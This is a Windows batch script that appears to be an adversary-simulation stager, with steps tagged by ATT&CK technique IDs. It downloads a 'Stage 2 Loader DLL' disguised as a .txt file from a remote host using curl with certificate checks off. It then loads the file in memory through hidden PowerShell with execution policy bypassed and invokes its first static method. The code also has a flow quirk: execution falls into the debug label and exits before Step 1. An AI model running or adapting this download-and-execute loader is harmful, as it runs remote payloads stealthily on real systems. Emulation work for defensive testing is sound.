@echo off
SETLOCAL EnableDelayedExpansion

REM ---- Placeholder constant declarations (random-named SET vars) ----
SET r1=%APPDATA%\10976\9ec6d03b
SET r2=wimrar.txt
SET r3=https://10.0.0.49/stage/2/icon.png?10976-7
SET r4=ITZEL-S2BO
SET r5=10976
SET r6=7
SET r7=%PUBLIC%\\macula-simulations.log

REM ---- Debug timestamp cache ----
SET tsvar=!DATE!/!TIME!

REM ---- Debug logging function ----
REM Usage: call :debug operation_name
REM Do not use side-effects; all logging appends to !r7!
:debug
echo [!tsvar!][DEBUG][%r4%][%r5%]: %~1 >> "!r7!" 2>nul
exit /b

REM ---- Step 1: Heartbeat fetch (download Stage 2 Loader DLL) ----
call :debug heartbeat_start
curl -k -s -o "!r1!\!r2!" "!r3!"
if errorlevel 1 (
    set hb_result=FAIL
    set hb_error=curl_exit_%ERRORLEVEL%
) else (
    set hb_result=OK
    set hb_error=
)
call :debug heartbeat_result=%ERRORLEVEL%
echo [!tsvar!][TTP][%r4%][%r5%]: T1218^|System Binary Proxy Execution=%hb_result%:%hb_error% >> "!r7!" 2>nul

REM ---- Step 2: Change working directory ----
call :debug chdir_start
cd /d "!r1!"
if errorlevel 1 (set cd_result=FAIL) else (set cd_result=OK)
call :debug chdir_result=%ERRORLEVEL%

REM ---- Step 3: Invoke Stage 2 Loader DLL via PowerShell reflection ----
call :debug invoke_start
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10976\9ec6d03b\wimrar.txt')); ($a.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null) }"
if errorlevel 1 (
    set ps_result=FAIL
    set ps_error=powershell_exit_%ERRORLEVEL%
) else (
    set ps_result=OK
    set ps_error=
)
call :debug invoke_result=%ERRORLEVEL%
echo [!tsvar!][TTP][%r4%][%r5%]: T1027^|Obfuscated Files or Information=%ps_result%:%ps_error% >> "!r7!" 2>nul

ENDLOCAL
exit /b 0